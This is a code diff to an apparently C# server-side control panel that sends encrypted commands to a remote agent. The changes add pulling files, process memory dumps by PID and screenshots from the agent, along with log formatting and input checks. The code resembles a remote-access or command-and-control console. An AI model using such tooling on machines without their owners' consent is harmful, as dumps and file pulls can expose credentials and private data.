@@ -95,19 +95,31 @@ namespace Server_side
             byte[] encryptedCommand = encryptor.Encrypt(command.Trim());
             NetworkLayer.Send(clientSocket, encryptedCommand);
 
-            logging("Command sent: " + commandBox.Text);
+            logging("Command sent|---|" + commandBox.Text);
 
             // Receive response
             byte[] response = NetworkLayer.ReceiveResult(clientSocket);
             string decryptedResponse = encryptor.Decrypt(response);
-            logging("Response received: " + decryptedResponse);
+            logging("Response received|---|" + decryptedResponse);
 
             commandBox.Text = "";
         }
 
         private void logging(string log)
         {
-            agentLogBox.AppendText(log + Environment.NewLine);
+            string[] parts = log.Split("|---|");
+            string boldText = $"{parts[0]}: ";
+            // Set bold text to blue color
+            agentLogBox.SelectionStart = agentLogBox.TextLength;
+            agentLogBox.SelectionLength = boldText.Length;
+            agentLogBox.SelectionColor = Color.Blue;
+            agentLogBox.SelectionFont = new Font(agentLogBox.Font, FontStyle.Bold);
+            agentLogBox.AppendText(boldText);
+            // Set the rest of the text to black color
+            agentLogBox.SelectionStart = agentLogBox.TextLength;
+            agentLogBox.SelectionLength = log.Length - boldText.Length;
+            agentLogBox.SelectionColor = Color.Black;
+            agentLogBox.AppendText(parts[1] + Environment.NewLine);
         }
 
         private void sendCommandBtn1_Click(object sender, EventArgs e)
@@ -119,6 +131,28 @@ namespace Server_side
                 case 0:
                     {
                         placeholder = agentfileBox.Text;
+                        if (string.IsNullOrEmpty(placeholder))
+                        {
+                            MessageBox.Show("Please enter a file path.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                            return;
+                        }
+                        string command = $"{cmdComboBox.SelectedIndex + 2}{delimiter}{placeholder}";
+                        byte[] encryptedCommand = encryptor.Encrypt(command.Trim());
+                        NetworkLayer.Send(clientSocket, encryptedCommand);
+
+                        logging("Command sent|---|" + cmdComboBox.Text);
+
+                        // Receive response
+                        try
+                        {
+                            byte[] file = GetResultFile(true);
+                            MessageBox.Show("File received successfully.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                        }
+                        catch (Exception ex)
+                        {
+                            logging("Error when receiving the file|---|" + ex.Message);
+                            MessageBox.Show("Error when receiving the file: " + ex.Message);
+                        }
                         break;
                     }
                 case 1:
@@ -128,8 +162,32 @@ namespace Server_side
                         break;
                     }
                 case 2:
-                    placeholder = "getprocessdump";
-                    break;
+                    {
+                        placeholder = pidBox.Text;
+                        if (string.IsNullOrEmpty(placeholder))
+                        {
+                            MessageBox.Show("Please enter a PID.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                            return;
+                        }
+                        string command = $"{cmdComboBox.SelectedIndex + 2}{delimiter}{placeholder}";
+                        byte[] encryptedCommand = encryptor.Encrypt(command.Trim());
+                        NetworkLayer.Send(clientSocket, encryptedCommand);
+
+                        logging("Command sent|---|" + cmdComboBox.Text);
+
+                        // Receive response
+                        try
+                        {
+                            byte[] dump = GetResultFile(true);
+                            MessageBox.Show("Process dump received successfully.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                        }
+                        catch (Exception ex)
+                        {
+                            logging("Error when receiving the process dump|---|" + ex.Message);
+                            MessageBox.Show("Error when receiving the process dump: " + ex.Message);
+                        }
+                        break;
+                    }
                 case 3:
                     {
                         placeholder = "getscreenshot";
@@ -137,7 +195,7 @@ namespace Server_side
                         byte[] encryptedCommand = encryptor.Encrypt(command.Trim());
                         NetworkLayer.Send(clientSocket, encryptedCommand);
 
-                        logging("Command sent: " + cmdComboBox.Text);
+                        logging("Command sent|---|" + cmdComboBox.Text);
 
                         // Receive response
                         try
@@ -180,12 +238,12 @@ namespace Server_side
                         byte[] encryptedCommand = encryptor.Encrypt(command.Trim());
                         NetworkLayer.Send(clientSocket, encryptedCommand);
 
-                        logging("Command sent: " + cmdComboBox.Text);
+                        logging("Command sent|---|" + cmdComboBox.Text);
 
                         // Receive response
                         byte[] response = NetworkLayer.ReceiveResult(clientSocket);
                         string decryptedResponse = encryptor.Decrypt(response);
-                        logging("Response received: " + decryptedResponse);
+                        logging("Response received|---|" + decryptedResponse);
 
                         MessageBox.Show("Client will be disconnected.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                         this.Close();
@@ -225,11 +283,19 @@ namespace Server_side
 
             if (saved)
             {
-                string filePath = Path.Combine("", fileName);
+                // Get file name instead of the full path
+                fileName = Path.GetFileName(fileName);
+                string filePath = Path.Combine(Program.myConfigs.AppSettings.Settings["DownloadFolder"].Value, fileName);
                 File.WriteAllBytes(filePath, fileData);
+                MessageBox.Show($"File saved to {filePath}", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
             }
 
             return fileData;
+        }
+
+        private void clearLogBtn_Click(object sender, EventArgs e)
+        {
+            agentLogBox.Clear();
         }
     }
 
